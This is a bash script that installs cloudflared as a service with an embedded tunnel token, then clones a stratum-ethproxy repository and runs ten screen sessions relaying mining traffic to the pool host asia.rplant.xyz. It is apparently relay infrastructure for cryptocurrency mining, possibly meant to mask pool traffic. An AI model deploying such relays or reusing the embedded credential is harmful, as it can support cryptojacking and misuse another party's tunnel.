# Install necessary packages
sudo apt update
sudo apt install -y docker.io npm 

# Add cloudflare gpg key
sudo mkdir -p --mode=0755 /usr/share/keyrings
curl -fsSL https://pkg.cloudflare.com/cloudflare-public-v2.gpg | sudo tee /usr/share/keyrings/cloudflare-public-v2.gpg >/dev/null

# Add this repo to your apt repositories
echo 'deb [signed-by=/usr/share/keyrings/cloudflare-public-v2.gpg] https://pkg.cloudflare.com/cloudflared any main' | sudo tee /etc/apt/sources.list.d/cloudflared.list

# install cloudflared
sudo apt-get update && sudo apt-get install cloudflared

sudo cloudflared service install eyJhIjoiYTAyNDU4ODdkZmQ4YTc3Yjk4MWM5ZjgyOGVlYjA3NTEiLCJ0IjoiZjU4MDIzZDctNGM5Ni00MzY1LThlNzEtOWM3ZjlkYjA3ZTdlIiwicyI6Ik56WTBNVGMxTXprdE5qY3hNeTAwT0RjMkxXSmlNalV0TUdNeE1qUmpPR1l4Wm1OaSJ9

# Clone the repository into a directory
git clone https://github.com/oneevil/stratum-ethproxy swam

for i in {1..10}; do
  # Set up and start each 'cpu' instance
  cd swam
  npm install
  # asia.rplant.xyz:17059
  # dagnam.xyz:4629
  # Set environment variables for 'cpu'
  LOCAL_IP=$(hostname -I | awk '{print $1}')
  cat <<EOL > .env
REMOTE_HOST=asia.rplant.xyz
REMOTE_PORT=17059
REMOTE_PASSWORD=x
LOCAL_HOST=$LOCAL_IP
LOCAL_PORT=$((442 + i))
EOL

  # Start the stratum-ethproxy in a detached screen session with a specific name
  sudo screen -dmS swam_$i npm start

  # Check if screen session was created successfully
  if [ $? -eq 0 ]; then
    echo "Started screen session swam_$i successfully."
  else
    echo "Failed to start screen session swam_$i."
  fi
  
  # Navigate back to the parent directory
  cd ..
done
